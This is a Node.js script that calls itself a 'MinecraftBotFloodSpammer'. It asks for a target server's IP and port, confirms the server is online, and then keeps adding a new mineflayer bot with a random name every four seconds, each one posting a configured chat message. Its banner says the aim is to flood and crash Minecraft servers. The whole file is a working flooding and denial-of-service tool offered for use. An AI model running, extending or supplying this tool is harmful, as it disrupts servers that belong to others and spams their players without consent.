const mineflayer = require('mineflayer');
const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
const superagent = require("superagent");
console.log(" __  __ _      __     \n"+"|  \\/  | |    / _|    \n"+"| \\  / | |__ | |_ ___ \n"+"| |\\/| | '_ \\|  _/ __|\n"+"| |  | | |_) | | \\__ \\ \n"+"|_|  |_|_.__/|_| |___/ ")
console.log("MinecraftBotFloodSpammer, is for spam bot on a minecraft server, running on several different IPs this tool can really crash a minecraft server.")
console.log('[CREDIT] Dev by Ezermoz#0001 \n')

readline.question("Whats the server ip ? (Use ipv4): ", 
    ipv4 => {
        var ip = ipv4
        readline.question("Whats the server port ? (Java Edition): ",
        port_tcp => {
          var port = port_tcp
          console.log("Try to test connectivity | IP: "+ip+":"+port_tcp)
          superagent.get(`https://mcapi.us/server/status?ip=${ip}&port=${port}`)
            .end((err, response) => {
              var statussrv = `${response.body.online}`                
                if(statussrv === "true") {
                  const config = require("./config.json")
                  var now_players = 0
                  const { uniqueNamesGenerator, adjectives,animals } = require('unique-names-generator');
                  console.log('Server On, players: ['+response.body.players.now+"/"+response.body.players.max+"] !") 
                  function get_request() {
                    const randomName = uniqueNamesGenerator({ dictionaries: [adjectives, animals] })
                    const bot = mineflayer.createBot({
                      host: ip,
                      port: port,
                      keepAlive: true,
                      username: randomName,
                      auth: `mojang`
                    })
                    console.log("[TRY] "+randomName)
                    bot.on('login', function() {
                      
                      bot.chat(config.loginmsg)
                      now_players++
                      console.log("[WORK] "+randomName+" now: [+"+now_players+"/"+response.body.players.max+"]")
                      })       
                      setTimeout( get_request, 4000);  
                   };
                  get_request();
                }else{
                  console.log("Offline... \n \n Pls restart the script...")
                }              
                })
              })
    })
// DEV BY EZERMOZ
//#antiskid, #inspirate-is-not-skid